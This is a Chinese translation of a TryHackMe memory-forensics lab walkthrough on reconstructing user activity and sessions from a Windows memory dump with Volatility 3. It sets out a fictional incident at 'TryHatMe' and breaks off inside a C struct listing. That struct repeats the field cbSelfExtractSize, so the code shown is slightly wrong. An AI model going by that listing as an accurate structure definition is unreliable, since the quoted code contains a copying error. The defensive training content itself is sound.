<!doctype html>
<html lang="zh" dir="ltr" class="docs-wrapper plugin-docs plugin-id-default docs-version-current docs-doc-page docs-doc-id-Modules/Memory Analysis/windowsmemoryanduseractivity" data-has-hydrated="false">
<head>
<meta charset="UTF-8">
<meta name="generator" content="Docusaurus v3.9.2">
<title data-rh="true">Windows内存与用户活动 | TryHackMe-CN</title><meta data-rh="true" name="viewport" content="width=device-width,initial-scale=1"><meta data-rh="true" name="twitter:card" content="summary_large_image"><meta data-rh="true" property="og:image" content="https://tryhackmyoffsecbox.github.io/TryHackMe-CN/img/docusaurus-social-card.jpg"><meta data-rh="true" name="twitter:image" content="https://tryhackmyoffsecbox.github.io/TryHackMe-CN/img/docusaurus-social-card.jpg"><meta data-rh="true" property="og:url" content="https://tryhackmyoffsecbox.github.io/TryHackMe-CN/docs/Modules/Memory Analysis/windowsmemoryanduseractivity"><meta data-rh="true" property="og:locale" content="zh"><meta data-rh="true" property="og:locale:alternate" content="en"><meta data-rh="true" name="docusaurus_locale" content="zh"><meta data-rh="true" name="docsearch:language" content="zh"><meta data-rh="true" name="docusaurus_version" content="current"><meta data-rh="true" name="docusaurus_tag" content="docs-default-current"><meta data-rh="true" name="docsearch:version" content="current"><meta data-rh="true" name="docsearch:docusaurus_tag" content="docs-default-current"><meta data-rh="true" property="og:title" content="Windows内存与用户活动 | TryHackMe-CN"><meta data-rh="true" name="description" content="任务 1 介绍"><meta data-rh="true" property="og:description" content="任务 1 介绍"><link data-rh="true" rel="icon" href="/TryHackMe-CN/img/favicon.ico"><link data-rh="true" rel="canonical" href="https://tryhackmyoffsecbox.github.io/TryHackMe-CN/docs/Modules/Memory Analysis/windowsmemoryanduseractivity"><link data-rh="true" rel="alternate" href="https://tryhackmyoffsecbox.github.io/TryHackMe-CN/en/docs/Modules/Memory Analysis/windowsmemoryanduseractivity" hreflang="en"><link data-rh="true" rel="alternate" href="https://tryhackmyoffsecbox.github.io/TryHackMe-CN/docs/Modules/Memory Analysis/windowsmemoryanduseractivity" hreflang="zh"><link data-rh="true" rel="alternate" href="https://tryhackmyoffsecbox.github.io/TryHackMe-CN/docs/Modules/Memory Analysis/windowsmemoryanduseractivity" hreflang="x-default"><script data-rh="true" type="application/ld+json">{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"模块","item":"https://tryhackmyoffsecbox.github.io/TryHackMe-CN/docs/Modules/"},{"@type":"ListItem","position":2,"name":"内存分析","item":"https://tryhackmyoffsecbox.github.io/TryHackMe-CN/docs/Modules/Memory Analysis/"},{"@type":"ListItem","position":3,"name":"Windows内存与用户活动","item":"https://tryhackmyoffsecbox.github.io/TryHackMe-CN/docs/Modules/Memory Analysis/windowsmemoryanduseractivity"}]}</script><link rel="alternate" type="application/rss+xml" href="/TryHackMe-CN/blog/rss.xml" title="TryHackMe-CN RSS Feed">
<link rel="alternate" type="application/atom+xml" href="/TryHackMe-CN/blog/atom.xml" title="TryHackMe-CN Atom Feed"><link rel="stylesheet" href="/TryHackMe-CN/assets/css/styles.6c4c8a38.css">
<script src="/TryHackMe-CN/assets/js/runtime~main.c6e97409.js" defer="defer"></script>
<script src="/TryHackMe-CN/assets/js/main.63d06b47.js" defer="defer"></script>
</head>
<body class="navigation-with-keyboard">
<svg style="display: none;"><defs>
<symbol id="theme-svg-external-link" viewBox="0 0 24 24"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"/></symbol>
</defs></svg>
<script>!function(){var t=function(){try{return new URLSearchParams(window.location.search).get("docusaurus-theme")}catch(t){}}()||function(){try{return window.localStorage.getItem("theme")}catch(t){}}();document.documentElement.setAttribute("data-theme",t||"light"),document.documentElement.setAttribute("data-theme-choice",t||"light")}(),function(){try{const c=new URLSearchParams(window.location.search).entries();for(var[t,e]of c)if(t.startsWith("docusaurus-data-")){var a=t.replace("docusaurus-data-","data-");document.documentElement.setAttribute(a,e)}}catch(t){}}()</script><div id="__docusaurus"><link rel="preload" as="image" href="/TryHackMe-CN/img/logo.svg"><div role="region" aria-label="跳到主要内容"><a class="skipToContent_fXgn" href="#__docusaurus_skipToContent_fallback">跳到主要内容</a></div><nav aria-label="主导航" class="theme-layout-navbar navbar navbar--fixed-top"><div class="navbar__inner"><div class="theme-layout-navbar-left navbar__items"><button aria-label="切换导航栏" aria-expanded="false" class="navbar__toggle clean-btn" type="button"><svg width="30" height="30" viewBox="0 0 30 30" aria-hidden="true"><path stroke="currentColor" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" d="M4 7h22M4 15h22M4 23h22"></path></svg></button><a class="navbar__brand" href="/TryHackMe-CN/"><div class="navbar__logo"><img src="/TryHackMe-CN/img/logo.svg" alt="My Site Logo" class="themedComponent_mlkZ themedComponent--light_NVdE"><img src="/TryHackMe-CN/img/logo.svg" alt="My Site Logo" class="themedComponent_mlkZ themedComponent--dark_xIcU"></div><b class="navbar__title text--truncate">TryHackMe-CN</b></a><a aria-current="page" class="navbar__item navbar__link navbar__link--active" href="/TryHackMe-CN/docs/Modules/">Tutorial</a><a class="navbar__item navbar__link" href="/TryHackMe-CN/blog">Blog</a></div><div class="theme-layout-navbar-right navbar__items navbar__items--right"><div class="navbar__item dropdown dropdown--hoverable dropdown--right"><a href="#" aria-haspopup="true" aria-expanded="false" role="button" class="navbar__link"><svg viewBox="0 0 24 24" width="20" height="20" aria-hidden="true" class="iconLanguage_nlXk"><path fill="currentColor" d="M12.87 15.07l-2.54-2.51.03-.03c1.74-1.94 2.98-4.17 3.71-6.53H17V4h-7V2H8v2H1v1.99h11.17C11.5 7.92 10.44 9.75 9 11.35 8.07 10.32 7.3 9.19 6.69 8h-2c.73 1.63 1.73 3.17 2.98 4.56l-5.09 5.02L4 19l5-5 3.11 3.11.76-2.04zM18.5 10h-2L12 22h2l1.12-3h4.75L21 22h2l-4.5-12zm-2.62 7l1.62-4.33L19.12 17h-3.24z"></path></svg>简体中文</a><ul class="dropdown__menu"><li><a href="/TryHackMe-CN/en/docs/Modules/Memory Analysis/windowsmemoryanduseractivity" target="_self" rel="noopener noreferrer" class="dropdown__link" lang="en">English</a></li><li><a href="/TryHackMe-CN/docs/Modules/Memory Analysis/windowsmemoryanduseractivity" target="_self" rel="noopener noreferrer" class="dropdown__link dropdown__link--active" lang="zh">简体中文</a></li></ul></div><a href="https://github.com/TryHackMyOffsecBox/TryHackMe-CN" target="_blank" rel="noopener noreferrer" class="navbar__item navbar__link">GitHub<svg width="13.5" height="13.5" aria-label="(opens in new tab)" class="iconExternalLink_nPIU"><use href="#theme-svg-external-link"></use></svg></a><div class="toggle_vylO colorModeToggle_DEke"><button class="clean-btn toggleButton_gllP toggleButtonDisabled_aARS" type="button" disabled="" title="system mode" aria-label="切换浅色/暗黑模式（当前为system mode）"><svg viewBox="0 0 24 24" width="24" height="24" aria-hidden="true" class="toggleIcon_g3eP lightToggleIcon_pyhR"><path fill="currentColor" d="M12,9c1.65,0,3,1.35,3,3s-1.35,3-3,3s-3-1.35-3-3S10.35,9,12,9 M12,7c-2.76,0-5,2.24-5,5s2.24,5,5,5s5-2.24,5-5 S14.76,7,12,7L12,7z M2,13l2,0c0.55,0,1-0.45,1-1s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S1.45,13,2,13z M20,13l2,0c0.55,0,1-0.45,1-1 s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S19.45,13,20,13z M11,2v2c0,0.55,0.45,1,1,1s1-0.45,1-1V2c0-0.55-0.45-1-1-1S11,1.45,11,2z M11,20v2c0,0.55,0.45,1,1,1s1-0.45,1-1v-2c0-0.55-0.45-1-1-1C11.45,19,11,19.45,11,20z M5.99,4.58c-0.39-0.39-1.03-0.39-1.41,0 c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0s0.39-1.03,0-1.41L5.99,4.58z M18.36,16.95 c-0.39-0.39-1.03-0.39-1.41,0c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0c0.39-0.39,0.39-1.03,0-1.41 L18.36,16.95z M19.42,5.99c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06c-0.39,0.39-0.39,1.03,0,1.41 s1.03,0.39,1.41,0L19.42,5.99z M7.05,18.36c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06 c-0.39,0.39-0.39,1.03,0,1.41s1.03,0.39,1.41,0L7.05,18.36z"></path></svg><svg viewBox="0 0 24 24" width="24" height="24" aria-hidden="true" class="toggleIcon_g3eP darkToggleIcon_wfgR"><path fill="currentColor" d="M9.37,5.51C9.19,6.15,9.1,6.82,9.1,7.5c0,4.08,3.32,7.4,7.4,7.4c0.68,0,1.35-0.09,1.99-0.27C17.45,17.19,14.93,19,12,19 c-3.86,0-7-3.14-7-7C5,9.07,6.81,6.55,9.37,5.51z M12,3c-4.97,0-9,4.03-9,9s4.03,9,9,9s9-4.03,9-9c0-0.46-0.04-0.92-0.1-1.36 c-0.98,1.37-2.58,2.26-4.4,2.26c-2.98,0-5.4-2.42-5.4-5.4c0-1.81,0.89-3.42,2.26-4.4C12.92,3.04,12.46,3,12,3L12,3z"></path></svg><svg viewBox="0 0 24 24" width="24" height="24" aria-hidden="true" class="toggleIcon_g3eP systemToggleIcon_QzmC"><path fill="currentColor" d="m12 21c4.971 0 9-4.029 9-9s-4.029-9-9-9-9 4.029-9 9 4.029 9 9 9zm4.95-13.95c1.313 1.313 2.05 3.093 2.05 4.95s-0.738 3.637-2.05 4.95c-1.313 1.313-3.093 2.05-4.95 2.05v-14c1.857 0 3.637 0.737 4.95 2.05z"></path></svg></button></div><div class="navbarSearchContainer_Bca1"></div></div></div><div role="presentation" class="navbar-sidebar__backdrop"></div></nav><div id="__docusaurus_skipToContent_fallback" class="theme-layout-main main-wrapper mainWrapper_z2l0"><div class="docsWrapper_hBAB"><button aria-label="回到顶部" class="clean-btn theme-back-to-top-button backToTopButton_sjWU" type="button"></button><div class="docRoot_UBD9"><aside class="theme-doc-sidebar-container docSidebarContainer_YfHR"><div class="sidebarViewport_aRkj"><div class="sidebar_njMd"><nav aria-label="文档侧边栏" class="menu thin-scrollbar menu_SIkG"><ul class="theme-doc-sidebar-menu menu__list"><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item"><div class="menu__list-item-collapsible"><a class="categoryLink_byQd menu__link menu__link--sublist menu__link--active" href="/TryHackMe-CN/docs/Modules/"><span title="模块" class="categoryLinkLabel_W154">模块</span></a><button aria-label="折叠侧边栏分类 &#x27;模块&#x27;" aria-expanded="true" type="button" class="clean-btn menu__caret"></button></div><ul class="menu__list"><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="categoryLink_byQd menu__link menu__link--sublist" tabindex="0" href="/TryHackMe-CN/docs/Modules/Attacking LLMs/"><span title="攻击大型语言模型" class="categoryLinkLabel_W154">攻击大型语言模型</span></a><button aria-label="展开侧边栏分类 &#x27;攻击大型语言模型&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="categoryLink_byQd menu__link menu__link--sublist" tabindex="0" href="/TryHackMe-CN/docs/Modules/Command Line/"><span title="命令行" class="categoryLinkLabel_W154">命令行</span></a><button aria-label="展开侧边栏分类 &#x27;命令行&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="categoryLink_byQd menu__link menu__link--sublist" tabindex="0" href="/TryHackMe-CN/docs/Modules/Container Security/"><span title="容器安全" class="categoryLinkLabel_W154">容器安全</span></a><button aria-label="展开侧边栏分类 &#x27;容器安全&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="categoryLink_byQd menu__link menu__link--sublist" tabindex="0" href="/TryHackMe-CN/docs/Modules/Host Evasions/"><span title="主机规避" class="categoryLinkLabel_W154">主机规避</span></a><button aria-label="展开侧边栏分类 &#x27;主机规避&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item"><div class="menu__list-item-collapsible"><a class="categoryLink_byQd menu__link menu__link--sublist menu__link--active" tabindex="0" href="/TryHackMe-CN/docs/Modules/Memory Analysis/"><span title="内存分析" class="categoryLinkLabel_W154">内存分析</span></a><button aria-label="折叠侧边栏分类 &#x27;内存分析&#x27;" aria-expanded="true" type="button" class="clean-btn menu__caret"></button></div><ul class="menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/TryHackMe-CN/docs/Modules/Memory Analysis/memoryanalysisintroduction"><span title="内存分析简介" class="linkLabel_WmDU">内存分析简介</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/TryHackMe-CN/docs/Modules/Memory Analysis/memoryacquisition"><span title="内存获取" class="linkLabel_WmDU">内存获取</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/TryHackMe-CN/docs/Modules/Memory Analysis/volatilityessentials"><span title="Volatility基础" class="linkLabel_WmDU">Volatility基础</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/TryHackMe-CN/docs/Modules/Memory Analysis/windowsmemoryandprocs"><span title="Windows内存与进程" class="linkLabel_WmDU">Windows内存与进程</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link menu__link--active" aria-current="page" tabindex="0" href="/TryHackMe-CN/docs/Modules/Memory Analysis/windowsmemoryanduseractivity"><span title="Windows内存与用户活动" class="linkLabel_WmDU">Windows内存与用户活动</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/TryHackMe-CN/docs/Modules/Memory Analysis/windowsmemoryandnetwork"><span title="Windows内存与网络" class="linkLabel_WmDU">Windows内存与网络</span></a></li></ul></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="categoryLink_byQd menu__link menu__link--sublist" tabindex="0" href="/TryHackMe-CN/docs/Modules/Microsoft Defender XDR/"><span title="Microsoft Defender XDR" class="categoryLinkLabel_W154">Microsoft Defender XDR</span></a><button aria-label="展开侧边栏分类 &#x27;Microsoft Defender XDR&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="categoryLink_byQd menu__link menu__link--sublist" tabindex="0" href="/TryHackMe-CN/docs/Modules/Starters/"><span title="入门挑战" class="categoryLinkLabel_W154">入门挑战</span></a><button aria-label="展开侧边栏分类 &#x27;入门挑战&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li></ul></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="categoryLink_byQd menu__link menu__link--sublist" href="/TryHackMe-CN/docs/Networks/"><span title="网络" class="categoryLinkLabel_W154">网络</span></a><button aria-label="展开侧边栏分类 &#x27;网络&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/TryHackMe-CN/docs/"><span title="index" class="linkLabel_WmDU">index</span></a></li></ul></nav></div></div></aside><main class="docMainContainer_TBSr"><div class="container padding-top--md padding-bottom--lg"><div class="row"><div class="col docItemCol_VOVn"><div class="docItemContainer_Djhp"><article><nav class="theme-doc-breadcrumbs breadcrumbsContainer_Z_bl" aria-label="页面路径"><ul class="breadcrumbs"><li class="breadcrumbs__item"><a aria-label="主页面" class="breadcrumbs__link" href="/TryHackMe-CN/"><svg viewBox="0 0 24 24" class="breadcrumbHomeIcon_YNFT"><path d="M10 19v-5h4v5c0 .55.45 1 1 1h3c.55 0 1-.45 1-1v-7h1.7c.46 0 .68-.57.33-.87L12.67 3.6c-.38-.34-.96-.34-1.34 0l-8.36 7.53c-.34.3-.13.87.33.87H5v7c0 .55.45 1 1 1h3c.55 0 1-.45 1-1z" fill="currentColor"></path></svg></a></li><li class="breadcrumbs__item"><a class="breadcrumbs__link" href="/TryHackMe-CN/docs/Modules/"><span>模块</span></a></li><li class="breadcrumbs__item"><a class="breadcrumbs__link" href="/TryHackMe-CN/docs/Modules/Memory Analysis/"><span>内存分析</span></a></li><li class="breadcrumbs__item breadcrumbs__item--active"><span class="breadcrumbs__link">Windows内存与用户活动</span></li></ul></nav><div class="tocCollapsible_ETCw theme-doc-toc-mobile tocMobile_ITEo"><button type="button" class="clean-btn tocCollapsibleButton_TO0P">本页总览</button></div><div class="theme-doc-markdown markdown"><header><h1>Windows内存与用户活动</h1></header>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="任务-1-介绍">任务 1 介绍<a href="#任务-1-介绍" class="hash-link" aria-label="任务 1 介绍的直接链接" title="任务 1 介绍的直接链接" translate="no">​</a></h2>
<p>在本房间中，我们将逐步介绍如何使用<strong>Volatility 3</strong>从<strong>Windows内存转储</strong>中调查用户活动。 作为分析师，了解在可疑事件发生时用户在系统上正在做什么非常重要。 这包括了解谁已登录、执行了什么命令、打开了哪些文件以及其他活动。</p>
<p>本房间是三部分系列中的第二部分。 我们将处理来自小型内部网络上受感染计算机的内存转储。 如果主机确实受到入侵，我们需要拼凑出攻击的范围和攻击链。</p>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="学习目标">学习目标<a href="#学习目标" class="hash-link" aria-label="学习目标的直接链接" title="学习目标的直接链接" translate="no">​</a></h3>
<ul>
<li class="">使用会话和注册表数据将登录与可疑活动关联起来。</li>
<li class="">识别与可疑访问相关的命令和文件访问。</li>
<li class="">从内存中重建用户操作。</li>
</ul>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="先决条件">先决条件<a href="#先决条件" class="hash-link" aria-label="先决条件的直接链接" title="先决条件的直接链接" translate="no">​</a></h3>
<ul>
<li class=""><a href="https://tryhackme.com/room/volatility" target="_blank" rel="noopener noreferrer" class="">Volatility</a></li>
<li class=""><a href="https://tryhackme.com/module/windows-fundamentals" target="_blank" rel="noopener noreferrer" class="">Windows基础模块</a></li>
<li class=""><a href="https://tryhackme.com/room/memoryanalysisintroduction" target="_blank" rel="noopener noreferrer" class="">内存分析简介</a></li>
<li class=""><a href="https://tryhackme.com/room/windowsmemoryandprocs" target="_blank" rel="noopener noreferrer" class="">Windows内存与进程</a></li>
</ul>
<div class="theme-admonition theme-admonition-info admonition_xJq3 alert alert--info"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 14 16"><path fill-rule="evenodd" d="M7 2.3c3.14 0 5.7 2.56 5.7 5.7s-2.56 5.7-5.7 5.7A5.71 5.71 0 0 1 1.3 8c0-3.14 2.56-5.7 5.7-5.7zM7 1C3.14 1 0 4.14 0 8s3.14 7 7 7 7-3.14 7-7-3.14-7-7-7zm1 3H6v5h2V4zm0 6H6v2h2v-2z"></path></svg></span>回答以下问题</div><div class="admonitionContent_BuS1"><details class="details_lb9f alert alert--info details_b_Ee" data-collapsed="true"><summary> 点击继续进入房间。 </summary><div><div class="collapsibleContent_i85q"><div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">No answer needed</span><br></span></code></pre></div></div></div></div></details></div></div>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="任务2场景信息">任务2场景信息<a href="#任务2场景信息" class="hash-link" aria-label="任务2场景信息的直接链接" title="任务2场景信息的直接链接" translate="no">​</a></h2>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="场景">场景<a href="#场景" class="hash-link" aria-label="场景的直接链接" title="场景的直接链接" translate="no">​</a></h3>
<p>您是处理TryHatMe公司事件的事件响应团队的一员，该公司专门在线销售帽子。 您的任务是分析一个可能被入侵的Windows主机的完整内存转储。 在您之前，另一位分析师已经获取了完整的内存转储，并从TryHatMe的IT支持团队收集了所有必要信息。 由于这是您的第一个案例，您有点紧张，但别担心；一位资深分析师将指导您。</p>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="事件信息thm-0001">事件信息THM-0001<a href="#事件信息thm-0001" class="hash-link" aria-label="事件信息THM-0001的直接链接" title="事件信息THM-0001的直接链接" translate="no">​</a></h3>
<ul>
<li class="">2025年5月5日07:30 CET，TryHatMe启动了其事件响应计划，并将事件上报给我们。 经过初步分类，我们的团队发现了一台可能被入侵的Windows主机。 主机的详细信息如下：<!-- -->
<ul>
<li class="">主机名：WIN-001</li>
<li class="">操作系统：Windows 1022H 10.0.19045</li>
</ul>
</li>
<li class="">07:45 CET，我们的分析师Steve Stevenson获取了Windows主机的完整内存转储，并生成了哈希值以确保其完整性。 内存转储的详细信息如下：<!-- -->
<ul>
<li class="">名称：<code>THM-WIN-001_071528_07052025.dmp</code></li>
<li class="">MD5哈希：<code>78535fc49ab54fed57919255709ae650</code></li>
</ul>
</li>
</ul>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="公司信息tryhatme">公司信息TryHatMe<a href="#公司信息tryhatme" class="hash-link" aria-label="公司信息TryHatMe的直接链接" title="公司信息TryHatMe的直接链接" translate="no">​</a></h3>
<h4 class="anchor anchorTargetStickyNavbar_Vzrq" id="网络拓扑图">网络拓扑图<a href="#网络拓扑图" class="hash-link" aria-label="网络拓扑图的直接链接" title="网络拓扑图的直接链接" translate="no">​</a></h4>
<p><img decoding="async" loading="lazy" alt="显示当前场景为网络拓扑图，包含DMZ内部、用户局域网和服务器局域网网络" src="/TryHackMe-CN/assets/images/image_20251255-215557-c8d815645075f11212bd6abd4a0ffb55.png" width="5084" height="3320" class="img_ev3q"></p>
<div class="theme-admonition theme-admonition-info admonition_xJq3 alert alert--info"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 14 16"><path fill-rule="evenodd" d="M7 2.3c3.14 0 5.7 2.56 5.7 5.7s-2.56 5.7-5.7 5.7A5.71 5.71 0 0 1 1.3 8c0-3.14 2.56-5.7 5.7-5.7zM7 1C3.14 1 0 4.14 0 8s3.14 7 7 7 7-3.14 7-7-3.14-7-7-7zm1 3H6v5h2V4zm0 6H6v2h2v-2z"></path></svg></span>回答以下问题</div><div class="admonitionContent_BuS1"><details class="details_lb9f alert alert--info details_b_Ee" data-collapsed="true"><summary>我已阅读案例详情，准备好了解更多信息。 </summary><div><div class="collapsibleContent_i85q"><div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">No answer needed</span><br></span></code></pre></div></div></div></div></details></div></div>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="任务3-环境与设置">任务3 环境与设置<a href="#任务3-环境与设置" class="hash-link" aria-label="任务3 环境与设置的直接链接" title="任务3 环境与设置的直接链接" translate="no">​</a></h2>
<p>在继续之前，请点击右侧的启动机器按钮<strong>启动虚拟机</strong>。</p>
<p>大约需要2分钟才能正常加载。 虚拟机将在分屏的右侧可访问。 如果看不到虚拟机，请使用页面顶部的蓝色<strong>显示分屏视图</strong>按钮。</p>
<p>我们将继续分析位于用户<strong>ubuntu</strong>主目录中的内存转储<strong>THM-WIN-001_071528_07052025.mem</strong>。</p>
<div class="theme-admonition theme-admonition-info admonition_xJq3 alert alert--info"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 14 16"><path fill-rule="evenodd" d="M7 2.3c3.14 0 5.7 2.56 5.7 5.7s-2.56 5.7-5.7 5.7A5.71 5.71 0 0 1 1.3 8c0-3.14 2.56-5.7 5.7-5.7zM7 1C3.14 1 0 4.14 0 8s3.14 7 7 7 7-3.14 7-7-3.14-7-7-7zm1 3H6v5h2V4zm0 6H6v2h2v-2z"></path></svg></span>回答以下问题</div><div class="admonitionContent_BuS1"><details class="details_lb9f alert alert--info details_b_Ee" data-collapsed="true"><summary> 如果您能够启动您的环境，请点击此处。 </summary><div><div class="collapsibleContent_i85q"><div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">No answer needed</span><br></span></code></pre></div></div></div></div></details></div></div>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="任务4-追踪会话">任务4 追踪会话<a href="#任务4-追踪会话" class="hash-link" aria-label="任务4 追踪会话的直接链接" title="任务4 追踪会话的直接链接" translate="no">​</a></h2>
<p>在本任务中，我们将研究如何找出在捕获内存时谁登录了系统。 这是任何调查的第一步之一，了解哪些用户账户存在并可能参与了我们感兴趣的活动。</p>
<p>Windows在内存中存储有关会话、交互式登录甚至应用程序使用情况的详细信息。</p>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="会话">会话<a href="#会话" class="hash-link" aria-label="会话的直接链接" title="会话的直接链接" translate="no">​</a></h3>
<p>在调查受感染系统时，了解当时哪些用户账户处于活动状态以及他们拥有何种类型的访问权限至关重要。 追踪会话使我们能够查看用户是物理在场、远程连接还是保持会话打开。 这有助于缩小哪些操作可归因于特定用户，以及账户在攻击期间是否被滥用。 会话数据还可以帮助区分常规活动与异常情况，例如在异常时间出现的会话，或来自意外来源/起源的会话。</p>
<p>Volatility插件通过定位内部Windows结构（其中一些未公开文档），如<strong>_SESSION_MANAGER_INFORMATION</strong>和<a href="https://learn.microsoft.com/en-us/windows/win32/devnotes/session" target="_blank" rel="noopener noreferrer" class="">会话结构</a>来检查内存。 让我们看看SESSION结构包含什么：</p>
<div class="language-c codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-c codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">struct</span><span class="token plain"> </span><span class="token class-name">SESSION</span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    ACTION    act</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    HFILELIST hflist</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    BOOL      fAllCabinets</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    BOOL      fOverwrite</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    BOOL      fNoLineFeed</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    BOOL      fSelfExtract</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">long</span><span class="token plain">      cbSelfExtractSize</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">long</span><span class="token plain">      cbSelfExtractSize</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">int</span><span class="token plain">       ahfSelf</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">cMAX_CAB_FILE_OPEN</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">int</span><span class="token plain">       cErrors</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" 